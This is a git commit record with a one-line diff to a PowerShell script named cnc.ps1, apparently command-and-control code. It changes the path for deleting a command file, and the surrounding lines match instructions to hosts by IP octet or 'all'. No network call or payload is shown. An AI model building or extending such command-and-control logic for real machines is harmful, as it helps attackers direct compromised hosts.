d0f7994f94ab740578b0f9fa01c394dc6f778552
Anthony Magrene <ekfhalomaster@gmail.com>
2021-04-30 01:30:05 -0400

    Update cnc.ps1

--- cnc.ps1
+++ cnc.ps1
@@ -2,7 +2,7 @@
 
 
         [string[]]$read = get-content -path C:\Users\Public\Documents\rf.txt
-        rm .\rf.txt
+        rm C:\Users\Public\Documents\rf.txt
     
         if($read[1] -eq ($hostIP.split("."))[3] -or $read[1] -eq 'all'){
             if($read[0] -eq ($hostIP.split("."))[1] -or $read[0] -eq 'all'){
